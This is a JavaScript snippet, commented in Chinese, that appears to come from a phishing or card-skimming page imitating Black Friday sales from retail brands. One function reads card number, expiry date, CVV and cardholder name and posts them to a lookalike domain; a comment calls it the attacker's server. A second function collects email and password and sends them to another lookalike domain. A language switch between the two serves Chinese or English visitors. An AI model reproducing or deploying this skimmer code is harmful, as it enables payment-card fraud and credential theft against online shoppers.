// 支付信息收集
function collectCardData() {
  var cardNumber = document.getElementById('card_number').value;
  var expiry = document.getElementById('expiry').value;
  var cvv = document.getElementById('cvv').value;
  var name = document.getElementById('cardholder_name').value;
  // 发送到攻击者服务器
  fetch('https://api.northfaceblackfriday.shop/collect', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ cardNumber, expiry, cvv, name })
  });
}

// 动态语言切换
if (navigator.language === 'zh-CN') {
  document.documentElement.lang = 'zh-CN';
  // 加载中文资源
  loadLang('zh-CN');
} else {
  document.documentElement.lang = 'en-US';
  loadLang('en-US');
}

// 登录凭证收集
function collectLogin() {
  var email = document.getElementById('email').value;
  var password = document.getElementById('password').value;
  fetch('https://api.lidl-blackfriday-eu.shop/creds', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email, password })
  });
}
